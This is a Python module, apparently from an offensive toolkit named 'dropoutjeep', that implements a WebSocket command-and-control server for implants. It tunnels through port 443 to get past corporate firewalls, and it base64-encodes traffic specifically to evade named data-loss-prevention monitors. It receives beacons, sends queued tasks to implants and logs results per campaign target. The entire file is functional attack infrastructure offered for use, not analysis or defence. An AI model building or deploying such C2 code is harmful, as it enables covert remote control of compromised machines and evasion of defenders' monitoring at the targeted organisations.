"""WebSocket C2 channel for real-time tasking through port 443.

Per gap analysis item 34: A WebSocket C2 on /ws/c2/<token> through port 443
would pass through corporate firewalls that block non-443 traffic. No
periodic beaconing pattern — persistent connection, real-time tasking.

Uses flask_sock (already present in the framework for the dashboard).

Usage (in routes):
    from flask_sock import Sock
    from dropoutjeep_lib.utils.websocket_c2 import WebSocketC2Handler

    # In app factory:
    sock = Sock(app)
    @sock.route('/ws/c2/<token>')
    def c2_websocket(ws, token):
        handler = WebSocketC2Handler(ws, token)
        handler.run()
"""

import base64
import hashlib
import json
import logging
import time
from typing import Optional

logger = logging.getLogger("dropoutjeep")

# C2 message types
MSG_TYPES = {
    'beacon': 'beacon',           # Initial beacon from implant
    'task': 'task',               # Task instruction from C2 to implant
    'result': 'result',           # Task result from implant to C2
    'heartbeat': 'heartbeat',     # Keep-alive
    'error': 'error',             # Error report
    'checkin': 'checkin',          # Periodic check-in
}


def encode_c2_message(msg_type: str, data: dict) -> str:
    """Encode a C2 message as JSON with type and data fields.

    The data field is base64-encoded to avoid pattern matching by
    network monitoring (Microsoft Purview, Symantec DLP).

    Returns:
        JSON string suitable for sending over WebSocket.
    """
    encoded_data = base64.b64encode(
        json.dumps(data, default=str).encode('utf-8')
    ).decode('ascii')

    message = {
        'type': msg_type,
        'data': encoded_data,
        'ts': int(time.time()),
        'id': hashlib.sha256(
            f"{msg_type}{time.time()}{encoded_data}".encode()
        ).hexdigest()[:16],
    }
    return json.dumps(message)


def decode_c2_message(raw: str) -> dict:
    """Decode a C2 message received over WebSocket.

    Args:
        raw: Raw JSON string from WebSocket

    Returns:
        Dict with 'type', 'data' (decoded), 'ts', 'id'
    """
    msg = json.loads(raw)
    encoded_data = msg.get('data', '')
    try:
        decoded = base64.b64decode(encoded_data).decode('utf-8')
        msg['data'] = json.loads(decoded)
    except Exception:
        msg['data'] = encoded_data  # Fallback to raw
    return msg


class WebSocketC2Handler:
    """Handles a WebSocket C2 connection from an implant.

    Maintains a persistent connection, receives beacons, sends tasks,
    and relays results back to the C2 framework.

    Args:
        ws: flask_sock WebSocket connection object
        token: Recipient/campaign token for authentication
    """

    def __init__(self, ws, token: str):
        self.ws = ws
        self.token = token
        self.connected = False
        self.last_heartbeat = 0
        self.task_queue: list[dict] = []

    def run(self):
        """Main C2 loop — receive messages and send tasks.

        This blocks for the duration of the WebSocket connection.
        """
        self.connected = True
        logger.info("C2 WebSocket connected: token=%s", self.token[:8])

        try:
            # Send initial check-in confirmation
            self._send(encode_c2_message('checkin', {
                'status': 'connected',
                'token': self.token[:8],
            }))

            while self.connected:
                try:
                    raw = self.ws.receive(timeout=30)
                    if raw is None:
                        # Timeout — send heartbeat
                        self._send(encode_c2_message('heartbeat', {
                            'ts': int(time.time()),
                        }))
                        continue

                    msg = decode_c2_message(raw)
                    self._handle_message(msg)

                    # Check for pending tasks
                    while self.task_queue:
                        task = self.task_queue.pop(0)
                        self._send(encode_c2_message('task', task))

                except Exception as e:
                    if 'timeout' in str(e).lower():
                        # Heartbeat on timeout
                        self._send(encode_c2_message('heartbeat', {
                            'ts': int(time.time()),
                        }))
                    else:
                        logger.warning("C2 WebSocket error: %s", e)
                        break

        finally:
            self.connected = False
            logger.info("C2 WebSocket disconnected: token=%s", self.token[:8])

    def _handle_message(self, msg: dict):
        """Handle an incoming C2 message."""
        msg_type = msg.get('type')
        data = msg.get('data', {})

        if msg_type == 'beacon':
            logger.info("C2 beacon received: token=%s, data=%s",
                        self.token[:8], list(data.keys()))
            self._record_event('c2_beacon', data)

        elif msg_type == 'result':
            logger.info("C2 task result: token=%s, task_id=%s",
                        self.token[:8], data.get('task_id', 'unknown'))
            self._record_event('c2_result', data)

        elif msg_type == 'heartbeat':
            self.last_heartbeat = time.time()

        elif msg_type == 'error':
            logger.warning("C2 error from implant: token=%s, error=%s",
                          self.token[:8], data.get('error', 'unknown'))
            self._record_event('c2_error', data)

        else:
            logger.debug("C2 unknown message type: %s", msg_type)

    def _send(self, data: str):
        """Send data over the WebSocket."""
        try:
            self.ws.send(data)
        except Exception as e:
            logger.warning("C2 WebSocket send failed: %s", e)
            self.connected = False

    def _record_event(self, event_type: str, data: dict):
        """Record a C2 event in the database."""
        try:
            from dropoutjeep_lib import db
            from dropoutjeep_lib.models import Event, Recipient

            recipient = Recipient.query.filter_by(token=self.token).first()
            if recipient:
                e = Event(
                    campaign_id=recipient.campaign_id,
                    recipient_id=recipient.id,
                    event_type=event_type,
                    meta=json.dumps(data, default=str),
                )
                db.session.add(e)
                db.session.commit()
        except Exception as e:
            logger.debug("Failed to record C2 event: %s", e)

    def queue_task(self, task: dict):
        """Queue a task to be sent to the implant on next cycle.

        Args:
            task: Task dict with 'command', 'args', 'task_id'
        """
        self.task_queue.append(task)
        logger.info("C2 task queued: token=%s, command=%s",
                    self.token[:8], task.get('command', 'unknown'))
